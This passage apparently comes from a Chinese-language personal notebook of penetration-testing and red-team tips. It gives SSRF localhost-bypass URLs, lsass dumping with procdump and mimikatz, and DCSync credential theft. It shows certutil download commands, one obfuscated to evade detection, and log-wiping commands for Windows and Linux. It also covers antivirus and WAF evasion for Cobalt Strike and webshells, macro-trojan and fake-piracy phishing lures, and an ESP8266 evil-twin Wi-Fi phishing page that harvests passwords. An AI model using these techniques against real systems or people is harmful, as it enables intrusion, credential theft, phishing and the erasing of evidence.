awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0000</span>::<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>[::]:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/<br>http:<span class="hljs-regexp">//</span>whitelisted@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7f000001/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0177.00</span>.<span class="hljs-number">00.01</span><br>http:<span class="hljs-regexp">//</span>⑯⑨。②⑤④。⑯⑨｡②⑤④/<br>http:<span class="hljs-regexp">//</span>⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>②⑧⑤②⓪③⑨①⑥⑥:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3a.<span class="hljs-number">0</span>xd6.<span class="hljs-number">0</span>xe3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd83ad6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3ad6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3a.<span class="hljs-number">0</span>xd6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0330.072</span>.<span class="hljs-number">0326.0343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">000330.0000072</span>.<span class="hljs-number">0000326.00000343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">033016553343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">3627734755</span><br>http:<span class="hljs-regexp">//</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">36</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">35</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">34</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">216.0</span>x3a.<span class="hljs-number">00000000326.0</span>xe3<br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-10-dec-24/</span><span class="hljs-comment">#13_ssrf_bypass_list_for_localhost_127001</span><br></code></pre></td></tr></table></figure><p>60、对于Apache shiro的CVE-2020-17523的未授权访问，是由于Spring+shiro结合造成的漏洞，可在路径后面添加<code>%20</code>，尝试访问该路径内容，造成未授权访问操作。</p><p>61、在一些验证码登录，找回密码等地方需要输入手机号，邮箱号的话，尝试配合SQL注入联合查询方式，填写可控手机号，实际情况实际分析。</p><p>62、密码爆破不如意，试试”密码喷洒攻击（Password Spray Attack）”法，多来收集用户名。</p><p>63、Exchange的下的目录以及功能介绍：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/autoDiscover/</span>自Exchange Server <span class="hljs-number">2007</span>开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。<br><span class="hljs-regexp">/ecp/</span>“Exchange Control Panel”Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台<br><span class="hljs-regexp">/eWS/</span>“Exchange Web Services”Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互<br><span class="hljs-regexp">/mapi/</span>Outlook连接Exchange的默认方式，在<span class="hljs-number">2013</span>和<span class="hljs-number">2013</span>之后开始使用，<span class="hljs-number">2010</span> sp2同样支持<br><span class="hljs-regexp">/microsoft-Server-ActiveSync/</span>用于移动应用程序访问电子邮件<br><span class="hljs-regexp">/OAB/</span>“Offline Address Book”用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担<br><span class="hljs-regexp">/owa/</span>“Outlook Web APP”Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等<br><span class="hljs-regexp">/powerShell/</span>用于服务器管理的Exchange管理控制台<br><span class="hljs-regexp">/Rpc/</span>早期的Outlook还使用称为Outlook Anywhere的RPC交互<br></code></pre></td></tr></table></figure><p>64、针对于Exchange的账号格式，可以尝试：<code>domain\username、domian.com\username、username</code></p><p>65、一个验证域名是否使用了Exchange的脚本：<code>https://github.com/vysecurity/checkO365</code></p><p>66、使用云函数的多出口特性，可以将其作为代理池来用。思路大概为：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">流程：浏览器请求数据 -&gt; 编写代理 -&gt; 通过代理将数据传给api网关 -&gt; api网关触发云函数并将参数作为event传入进云函数内 (然后反向流程将数据返回到浏览器中)<br>所以我们大致编写代码步骤为：<br><span class="hljs-number">1</span>、编写云函数，使用api网关做触发器，云函数主要处理api网关传来的数据，再将访问返回的数据包传会给api网关<br><span class="hljs-number">2</span>、编写代理代码，主要接收浏览器传来的数据，并将数据整理传给api网关，然后回到第一步。<br>注：这是一个思路，具体实现不局限于此，各位大佬各显神通吧~<br></code></pre></td></tr></table></figure><p>每5000字一个tips结尾</p><p>小tips2</p><p>‘反引号可以在xxs中绕过，不可以在sql中，但是好像在网站中可以</p><p>学校的英语听远程定时关机重启开机，开关显示屏</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">linux关闭显示器命令：xset dpms <span class="hljs-literal">force</span> <span class="hljs-literal">off</span><br>win:可以命令修改休眠时间，命令定时开启机器<br></code></pre></td></tr></table></figure><ol><li><strong>第一点</strong>：写http隧道马的时候，用哥斯拉直接编辑新建一个隧道马，但是连接的时候报错，可能是哥斯拉出现了数据断流，导致写进去的文件缺东西了，后来直接把隧道马传上去就不报错了。</li><li><strong>第二点</strong>：网上的例子大多数都用pystinger反代cs服务端来处理这种不出网上线cs的情况，但是可能因为目标网络环境的不一样导致各种玄学报错，所以Pystinger的局限性还是很大的，而且Pystinger客户端还不免杀。</li><li><strong>第三点</strong>：正向shell免杀，不多说的，cs的无阶段木马都是这样，无法通过混淆加载器的方法免杀。</li><li><strong>第四点</strong>：正向shell的提权，cs插件提权只能反弹一个反射型的shell，无法反弹正向shell。</li><li><strong>第五点</strong>：有趣的是，无阶段木马是能生成powershell脚本的，而powershell脚本是很好混淆免杀的，但是目标是server2016，默认开启AMSI，混淆免杀在它面前形同虚设。（要是目标是2012、2008系统就可以通过powershell正向bind上线）</li></ol><p>alt+鼠标拖动可以进行按列选取</p><p>sqlmap—–shell</p><p>-priv和-osshell的使用  可以直接上传转换为自己的或者sqlmap自带的aspx码。php码等，还可以利用上传的码转发给msf。cs，或者转换新码加固。转到msf，cs后可以进行进程转发。注入进程等</p><p>拿到spn票据然后破解可以得到域的密码（kali有相关的工具）</p><p>ls -l &#x2F;etc&#x2F;passwd的返回种 -rw-r- -r- -表示&#x2F;etc&#x2F;passwd文件不允许除root以外的用户进行写入，但passwd命令可以（通过setuid机制）临时以root权限来运行</p><p>-r-s- -x- -x中的 r-s  这里的s表示该程序以启用setuid</p><p>-rws- -x- -x 中的rws表示已经启用了setuid</p><p>s 192.168.8.6       p 4000           i 10.0.92.92</p><p> G 10.0.92.1  M 255.255.252.0</p><p>s应该是服务端，p是端口，i是ipv4，g是网关，m是子网掩码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">声东击西，其实已经沦陷了别人在偷数据你们却被大量无用日志一叶障目。：偷数据的同时增加大量各种日志<br><br>，你完全可以用任何编码、加密算法，来发送你的 payload, 前提是你的 webshell 里面有对应的解码、解密算法。比如说你可以在 <span class="hljs-keyword">base64 </span>数据前面随机加几个字符，导致 <span class="hljs-keyword">base64 </span>无法直接解码，或者，你还可以像下面这样，直接用 zlib 把 payload 压缩之后再进行 <span class="hljs-keyword">base64 </span>编码发送：<br><br>当然了，针对 WAF最爱的 eval、<span class="hljs-keyword">base64_decode </span>等关键字，会强制进行拆分，美中不足的是，目前 nodejs 对畸形chunk支持还不是很好，无法发送畸形的 chunk 包。当然这种方式也是利用的 WAF 对该类型的报文解析不完善。有个思路是，你可以自己写一个 Proxy 来专门把普通的包转成畸形包。<br><br>图片<br><br>聪明的你是不是已经想到了，<span class="hljs-keyword">burp </span>有个插件 chunked-converter 就可以完成这件事，不过你需要自己改改他的代码。<br><br>这种传输方式，要想检测到，WAF也得相应的支持对 chunk 分块传输的解析，在接到数据包的时候需要把之前的报文能关联起来进行分析。还是那句话，考虑性能<br><br>很多免杀都是将<span class="hljs-keyword">shellcode加载器写到一个文件中去，再使用另外一个脚本调用，多层调用，多层加密，加壳</span><br><span class="hljs-keyword"></span><br><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">最近看到一个文章《Rust 是可能编程的未来》，现在看到了php利用web java利用反序列化，python写poc，nim，go啥的都可以写攻击脚本和攻击工具，<span class="hljs-keyword">c</span>/<span class="hljs-keyword">c</span>++语言最底层编译，二进制做逆向。再加上现在的rust有一种未来会成为主流开发人员利用工具，且可以在多种领域使用。将来网站也可能是用rust作为一种开发手段。 而这种工具随着历史的推移也会不断进步迭代。渗透人改如何跟进甚至超越时代脚步。用自身的态势感知去掌握先进工具的利用，编写红队工具等方法来充分利用这些工具。渗透人该怎么去适应这种趋势呢?这是一个值得思考的问题。<br></code></pre></td></tr></table></figure><p>能联网就能反向连接</p><p>pyinstxtractor.py居然可以破解<code>pyinstaller --key -F </code>参数加密打包的文件。</p><p>而且生成的_key文件里面有密码</p><p>,CS生成的ShellCode只是一段下载者。主要功能为下载becon.dll，然后内存加载，我们所用的相关功能都在becon里。ShellCode可能采用汇编或VC编写后转成机器码提取关键机器码，优势在于体积小。体积小就可以直接结合漏洞使用</p><p>**<br>指令:** 命令cpu干什么,是由操作码字段和地址码字段(操作数字段)组成</p><p><strong>操作码(Opcode):</strong> 就是执行某种操作的命令代码</p><p><strong>BYTECODE(字节码）：</strong>与机器代码相同,除了它主要由基于软件的解释器(如Java或CLR)使用**<br>**</p><p><strong>程序集：</strong>有两个“程序集” – 一个汇编程序是一系列的助记符和操作数,它们被馈送到“汇编程序”,“<strong>汇编程序</strong>”将助记符和操作数“汇编成可执行的机器代码”.可选地,“链接器”链接组件并生成可执行文件.</p><p><strong>CLR语言：</strong>(.NET语言)中的第二个“程序集”是一系列CLR代码,其中注入了元数据信息,可执行代码库,但不能直接执行.</p><p><strong>ShellCode</strong>是子弹，用枪发射(好比处理器执行); 无论你用的是哪种子弹(ShellCode)，都是用枪来射(处理器执行)。</p><p><strong>Payload:</strong> K8的理解是弹药，弹药可装填到弹壳里用，也可直接点然，也可圈起来当成炮仗点燃，但是弹药不能直接被枪发射。</p><p>推荐挖挖培训机构（不少都是上市公司，而且对安全这一块相对不怎么重视）</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">利用procdump+Mimikatz来读取windows明文密码。<br><br>由于prodump.exe是微软系统自带，有微软的签名证书，所以杀软不会拦截。<br>\<span class="hljs-meta"># lsass.dmp保存至当前目录</span><br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>\<span class="hljs-meta"># 脱回本地，猕猴桃（mimikatz）读取明文密码</span><br><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.dmp<br><span class="hljs-symbol">sekurlsa:</span>:logonpasswords<br></code></pre></td></tr></table></figure><p>断网状态下登录之前登录过的svip账户再连接上网络就能继续使用</p><p>win dir等于linux ls</p><p>socks5不支持icmp协议   不能ping</p><p>shell进入后 权限不够高，可以使用看现有语言环境（php python go c等），根据环境代码进行各种半交互提权</p><p>学习游戏打球！！！ 2021&#x2F;11&#x2F;26 15:25:39<br>PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DAT，是⼀个项⽬管理系统</p><p>这是啥</p><p>0、如何利⽤这个防注⼊系统拿 shell？<br>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce这个路径，也是能够添加指向程序的路径来实现自启动的，这里跟之前有一点不同的就是这个路径下的key在重启后执行一次就会自动删除，而Run目录下的注册表如果不去管他他会一直存在</p><p>copy ab那个是脚本图片码，不是二进制图片码</p><p>其实前面这些魔改只是做的表面功夫，真正到实战当中还是会被实力强的杀软秒杀，比如卡巴斯基等。遇到这些对手，需要让beacon和其他后渗透模块高度自定义，这里面涉及到很多方面，静态和行为都需要改造，所以单从魔改CS的客户端、服务端和控制端已经远远不够了，并且灵活度太低，参考快乐鸡哥师傅用C#重写的SharpBeacon（师傅YYDS）。另外，鉴于改造CS的客户端这么麻烦，不如在搞清楚CS的内部原理之后，在外部建设一个Stager生成服务，通过CS的配置动态生成各种语言版本的Stager，这样省去了通过Agent动态替换JAVA指令的麻烦，灵活度大大增加。（stager就是监听器的那些域名或者ip啥的（内容框里是这些，不太好解释，暂时也不太懂））</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">免杀还是具有时效性，如果有不怕时效性甚至能够像Ai一样自我升级<br><br>或者说有个很强大的论坛平台或者人群基数，去进行想法创新而产生的维护。这是我未来的一些思考和方向<br></code></pre></td></tr></table></figure><p>内核溢出是用来提权 不是用来拿shell<img src="file:///C:\Users\e'e't\AppData\Roaming\Tencent\QQTempSys\Z}4JA~3{S79KP7UYELJH" alt="img">{7.gif)</p><p>拿到 shell 之后，发现有 360 主动防御和 360 杀毒？</p><p><strong>可以试试命令：</strong><strong><code>logoff 1</code> 或者 <code>logoff 2</code> ，会有意想不到的效果~</strong></p><p>拿到 shell，将 3389 端口转发出来之后，尝试连接发现出现问题，估计是限制了我这边的 IP 访问。</p><p><img src="G:/AppData/Roaming/Typora/typora-user-images/640.webp" alt="图片"></p><p>解决方法：添加注册表 <code>AllowEncryptionOracle</code> 项即可。</p><p>参考：<a href="https://www.cnblogs.com/lindajia/p/9021082.html">https://www.cnblogs.com/lindajia/p/9021082.html</a></p><p>一条命令直接解决（需要在 system32 目录下的 cmd 中执行）：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f</span><br></code></pre></td></tr></table></figure><p>进入内往后本地开服务，内网连接服务器下载lcx进行端口转发</p><p>在命令前加空格，命令不会被记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[空格]<span class="hljs-built_in">cat</span> /etcpasswd<br></code></pre></td></tr></table></figure><p>坚持把不懂得渗透脚本函数写下来并背下来</p><p>cmd隐藏文件    attrib test.txt</p><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><p>•robots.txt•crossdomain.xml•sitemap.xml•后台目录•网站安装目录•网站上传目录•mysql管理页面•phpinfo•网站文本编辑器•测试文件•网站备份文件（.rar、.zip、.7z、.tar、.gz、.bak）•DS_Store文件•vim编辑器备份文件（.swp）•WEB-INF&#x2F;web.xml文件</p><p>蚁剑后渗透模块反弹shell到msf火绒不会查杀</p><p>钓鱼的时候先发多发几个文件。前几个就正常查询文件，最后一个做好宏免杀的木马。就行，有的人就一定会一个一个点进去看一看</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640.webp" alt="图片"></p><p>“c””e””r””t””u””t””i””l” -“u””r””l””c””a””c””h””e” -split -f https:<em>&#x2F;&#x2F;url&#x2F;1.exe 1.exe</em></p><p>powershell编辑</p><p>可以用“您是盗版软件受害者”来钓鱼</p><p>可以用shell C:\tmp\bypassuac.exe C:\tmp\beacon.exe来提权</p><p>内网信息收集时导出所有spn到文本后，将主机名列出</p><p>grep “CN&#x3D;” spn.txt | awk -F “,” {‘print $1’} | awk -F “&#x3D;” {‘print $2’} &gt; host.txt</p><p>拿下了域控</p><p>导出ntds,抓下密码,这里使用mimikatz<code>lsadump::dcsync /domain:xxx /all /csv command</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Bvp47 在 Hook 掉__d_lookup 函数后主要用于自身文件的隐藏和触发自删除 流 程 ， 利 用 hook <br><br>__d_lookup 来 校 验 上 层 应 用 是 否 试 图 访 问 <span class="hljs-regexp">/usr/</span>bin/modload 文件<br><br>Hook devmem_is_allowed 后，用户态的 Bvp47 就可以任意读写内核空间了。<br><br>Bvp47 会通过修改内核模块 elf 文件的前四个字节，达到躲避内存搜索 elf 的目的，并通过自己的 <br><br>lkm loader 进行加载。 <br><br>BPF（Berkeley Packet Filter）是 Linux 内核中用来过滤自定义格式数据包的内核引擎，它可以提<br><br>供一套规定的语言供用户层的普通进程来过滤指定数据包。<br><br>Bvp47 直接利用 BPF 的这个特性作为隐蔽信道环节中在 Linux 内核层面的高级技巧，避免直接的<br><br>内核网络协议栈 hook 被追踪者检测出来。 <br><br>其它技术特点<br><br>不受信任的程序往往由沙箱运行并监测行为。程序运行时往往并没有真正落地，也就时说此时的<br><br>argv[<span class="hljs-number">0</span>]所指路径并不是程序的真正路径。程序通过syscall调用lstat，以求绕过SandboxRing3的<br><br>Hook，查看argv[<span class="hljs-number">0</span>]所指的文件是否真实存在。<br><br>**<span class="hljs-number">1</span>. 利用setrlimit api来设置core <span class="hljs-keyword">dump</span>文件（内核转存文件）大小<span class="hljs-number">0</span>，防止样本提取；**<br><br>**<span class="hljs-number">2</span>. argv[<span class="hljs-number">0</span>]与lstat结合的反沙箱技术；**<br><br>mkstmp时用来在Linux /tmp目录下生成临时文件的Api。（猜测时由于当时沙箱并没有对这个Api<br><br>提供支持，或者沙箱策略禁用了mkstmp。因此可以用mkstmp调用是否成功来识别沙箱）。<br><br>**<span class="hljs-number">3</span>. mkstmp 反沙箱技术**<br><br>沙箱中的<span class="hljs-regexp">/boot目录下的文件往往只有2个一个文件/</span>boot<span class="hljs-regexp">/.另一个/</span>boot<span class="hljs-regexp">/..。所以只要打开/</span>boot目<br><br>录统计/boot目录下的文件个数，往往可以识别沙箱。（Windows上会通过TEMP目录下的临时文<br><br>件数）。<br><br>**<span class="hljs-number">4</span>. /boot 反沙箱技术**<br><br>沙箱中的<span class="hljs-regexp">/boot目录下的文件往往只有2个一个文件/</span>boot<span class="hljs-regexp">/.另一个/</span>boot<span class="hljs-regexp">/..。所以只要打开/</span>boot目<br><br>录统计/boot目录下的文件个数，往往可以识别沙箱。（Windows上会通过TEMP目录下的临时文<br><br>件数）<br><br>**<span class="hljs-number">5</span>. Aip Flooting 与 延迟执行**<br><br>任何沙箱只会为每个样本分配有限的时间。因此调用大量合法Api，以达到延迟执行，用以躲过沙<br><br>箱的起爆分析。<br><br>rc-x<br><br>SYNKn<br></code></pre></td></tr></table></figure><p>遇到302 如何让sql跑起了</p><p>直接在响应包里面让他报错，然后让sqlmap自动识别即可  这个点可以记住</p><p>Arduino+esp8266+钓鱼wifi(20RMB)</p><ol><li>使用Arduino IDE 然后单片机是用的esp8266（具体编译环境的配置可以参考<a href="http://www.taichi-maker.com/%EF%BC%89">http://www.taichi-maker.com/）</a></li><li>如果只是测试玩的话大概淘宝9.9元也是可以买到的，只不过如果需要带电池单元的话可能就须要再买个电池模块了</li><li>步骤是，先把写好的页面写入到闪存里面去，然后再把程序烧录到里面去，插上电就可以搞了</li><li>用户连接到我们的wifi（无密码），就会自动弹窗到钓鱼页面中去（这个利用了DNS协议）</li><li>用户输入口令到页面中，然后提交，程序就会把信息存储到&#x2F;info.txt中，也会输出到串口中</li><li>钓鱼完成后 使用show_info程序从闪存中读出来信息即可</li></ol><p>Ctrl+K+C快速批量注释</p><p>winodws桌面：TeamViewerQS单文件</p><p>windows下载文件；<br>certutil -urlcache -split -f <a href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2017-11882-v1.py">https://raw.githubusercontent.com/backlion/demo/master/CVE-2017-11882-v1.py</a> test.py</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">日志清理:<br><br>winodws桌面：TeamViewerQS单文件<br><br>windows下载文件；<br>certutil -urlcache -split -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/backlion/</span>demo<span class="hljs-regexp">/master/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">11882</span>-v1.py test.py<br><br>防火墙日志路径：%systemroot%\system32\logfiles\<br>IIS日志路径：%systemroot%\system32\logfles\<br>windows系统日志：%systemroot%\system32\config\<br>Scheduler服务日志：%systemroot%\schedlgu.txt<br>日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog<br>系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx<br>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx<br>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx<br><br>linux（检索根目录以及上级目录是否存在备份）<br><span class="hljs-number">1</span>.清空当前用户历史命令并删除相关文件：<br>history -c<br>echo “”&gt; <span class="hljs-regexp">/root/</span>.bash_history<br>echo “”&gt; <span class="hljs-regexp">/var/</span>run/utmp<br><span class="hljs-number">2</span>.清除部分日志：echo “”&gt; <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/secure；全删除如不能删除使用echo依次覆盖：rm -f -r /</span>var<span class="hljs-regexp">/log/</span>*；<br><span class="hljs-regexp">/var/</span>log/boot.log：录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息<br><span class="hljs-regexp">/var/</span>log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息<br><span class="hljs-regexp">/var/</span>log/messages ：记录Linux操作系统常见的系统和服务错误信息<br><span class="hljs-regexp">/var/</span>log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况<br><span class="hljs-regexp">/var/</span>log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址<br><span class="hljs-regexp">/var/</span>log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看<br><span class="hljs-regexp">/var/</span>log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看<br><span class="hljs-regexp">/var/</span>log/maillog 与邮件相关的日志信息<br><span class="hljs-regexp">/var/</span>log/cron 与定时任务相关的日志信息<br><span class="hljs-regexp">/var/</span>log/spooler 与UUCP和news设备相关的日志信息<br><span class="hljs-regexp">/var/</span>log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)<br><span class="hljs-regexp">/var/</span>run/utmp：该日志文件记录有关当前登录的每个用户的信息。如 who、w、users、finger等就需要访问这个文件<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frsocks+protoplex+流量重定向实现端口复用<br>protoplex是一个协议复用的工具，比如以下命令可将本地<span class="hljs-number">9999</span>端口的流量根据协议类型转到本地的<span class="hljs-number">2333</span>和<span class="hljs-number">80</span>端口。用于绕过云主机的nsg安全规则。<br>./frsocks -sockstype fsocks -listen <span class="hljs-number">2333</span>  <span class="hljs-comment">//创建本地监听</span><br>./protoplex <span class="hljs-attr">--socks5</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">154.130</span>:<span class="hljs-number">2333</span> <span class="hljs-attr">--http</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">154.130</span>:<span class="hljs-number">9999</span>  <span class="hljs-comment">//端口分流，根据协议类型转到本地的2333和80端口</span><br>重定向命令<br>linux：<br>sudo iptables -t nat -A PREROUTING -<span class="hljs-selector-tag">p</span> tcp -m tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j REDIRECT <span class="hljs-attr">--to-ports</span> <span class="hljs-number">9999</span><br>windows:<br>netsh interface portproxy add v4tov4 listenport=<span class="hljs-number">80</span> listen address=<span class="hljs-number">192.168</span>.<span class="hljs-number">154.129</span> connectport=<span class="hljs-number">9999</span> connectaddress=<span class="hljs-number">192.168</span>.<span class="hljs-number">154.129</span><br><span class="hljs-number">1</span><span class="hljs-selector-class">.netsh</span> interface portproxy show <span class="hljs-attribute">all</span> //查看转发规则<br><span class="hljs-number">2</span><span class="hljs-selector-class">.netsh</span> interface portproxy reset   <span class="hljs-comment">//清除所有转发规则</span><br></code></pre></td></tr></table></figure><p> searchtometerpreter可以从commband shell 进入materpretershell</p><p>Impacker组件的py版本 进行收集比较稳。比mimikatz还稳</p><p>发现可以通过下载证书的方式得到webshell。</p><figure class="highlight php"><table><tr><td 